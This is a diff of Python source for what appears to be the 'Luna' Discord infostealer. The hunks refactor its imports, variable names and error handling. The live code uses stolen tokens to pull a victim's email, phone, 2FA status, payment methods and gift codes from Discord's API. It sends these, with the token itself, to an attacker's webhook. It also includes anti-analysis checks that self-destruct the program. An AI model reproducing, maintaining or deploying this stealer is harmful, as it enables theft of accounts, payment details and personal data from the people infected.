@@ -1,4 +1,5 @@
 import base64
+import ctypes
 import json
 import os
 import platform
@@ -8,20 +9,18 @@ import sqlite3
 import subprocess
 import threading
 import uuid
-import ctypes
-import psutil
-import requests
-import wmi
-
-from Crypto.Cipher import AES
-from discord import Embed, File, SyncWebhook
-from PIL import ImageGrab
-from win32crypt import CryptUnprotectData
 from shutil import copy2
 from sys import argv
 from tempfile import gettempdir, mkdtemp
 from zipfile import ZIP_DEFLATED, ZipFile
 
+import psutil
+import requests
+import wmi
+from Crypto.Cipher import AES
+from discord import Embed, File, SyncWebhook
+from PIL import ImageGrab
+from win32crypt import CryptUnprotectData
 
 __WEBHOOK__ = "%webhook_here%"
 __PING__ = "%ping_enabled%"
@@ -138,7 +137,6 @@ class PcInfo:
         webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
 
 
-@try_extract
 class Discord:
     def __init__(self):
         self.baseurl = "https://discord.com/api/v9/users/@me"
@@ -278,65 +276,57 @@ class Discord:
 
             val_codes = []
             val = ""
-            nitro = "❌"
+            nitro = ""
 
             headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                        'Content-Type': 'application/json',
                        'Authorization': token}
 
-            r = requests.get(self.baseurl, headers=headers).json()
-            b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
-            g = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)
+            user = requests.get(self.baseurl, headers=headers).json()
+            payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
+            gift = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)
 
-            username = r['username'] + '#' + r['discriminator']
-            discord_id = r['id']
-            avatar = f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.gif" if requests.get(
-                f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.png"
-            phone = r['phone']
-            email = r['email']
+            username = user['username'] + '#' + user['discriminator']
+            discord_id = user['id']
+            avatar = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" if requests.get(
+                f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
+            phone = user['phone']
+            email = user['email']
 
-            try:
-                if r['mfa_enabled']:
-                    mfa = "✅"
-                else:
-                    mfa = "❌"
-            except Exception:
+            if user['mfa_enabled']:
+                mfa = "✅"
+            else:
                 mfa = "❌"
 
-            try:
-                if r['premium_type'] == 1:
-                    nitro = 'Nitro Classic'
-                elif r['premium_type'] == 2:
-                    nitro = 'Nitro'
-                elif r['premium_type'] == 3:
-                    nitro = 'Nitro Basic'
-            except BaseException:
-                nitro = nitro
+            if user['premium_type'] == 0:
+                nitro = "❌"
+            elif user['premium_type'] == 1:
+                nitro = 'Nitro Classic'
+            elif user['premium_type'] == 2:
+                nitro = 'Nitro'
+            elif user['premium_type'] == 3:
+                nitro = 'Nitro Basic'
+            else:
+                nitro = "❌"
 
-            if b == []:
+            if payment == []:
                 methods = "❌"
             else:
                 methods = ""
-                try:
-                    for method in b:
-                        if method['type'] == 1:
-                            methods += "💳"
-                        elif method['type'] == 2:
-                            methods += "<:paypal:973417655627288666>"
-                        else:
-                            methods += "❓"
-                except TypeError:
-                    methods += "❓"
+                for method in payment:
+                    if method['type'] == 1:
+                        methods += "💳"
+                    elif method['type'] == 2:
+                        methods += "<:paypal:973417655627288666>"
+                    else:
+                        methods += "❓"
 
             val += f'<:1119pepesneakyevil:972703371221954630> `Discord ID:` **{discord_id}** \n<:gmail:1024717106996064296> `Email:` **{email}**\n:mobile_phone: `Phone:` **{phone}**\n\n🔒 `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:1024718620896538787> `Billing:` **{methods}**\n\n<:crown1:1024719305482444851> `Token:` **{token}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'
 
-            if "code" in g.text:
-                codes = json.loads(g.text)
-                try:
-                    for code in codes:
-                        val_codes.append((code['code'], code['promotion']['outbound_title']))
-                except TypeError:
-                    pass
+            if "code" in gift.text:
+                codes = json.loads(gift.text)
+                for code in codes:
+                    val_codes.append((code['code'], code['promotion']['outbound_title']))
 
             if val_codes == []:
                 val += f'\n:gift: **No Gift Cards Found**\n'
@@ -377,7 +367,6 @@ class Discord:
             embed=embed2,
             file=file,
             username="Luna")
-        os.close(image)
 
 
 @try_extract
@@ -710,7 +699,6 @@ class Debug:
     tempfolder = mkdtemp()
 
     def __init__(self):
-
         if self.checks():
             self.self_destruct()
 
@@ -799,7 +787,6 @@ class Debug:
             debugging = True
         if self.get_system():
             debugging = True
-
         return debugging
 
     def check_process(self) -> bool:
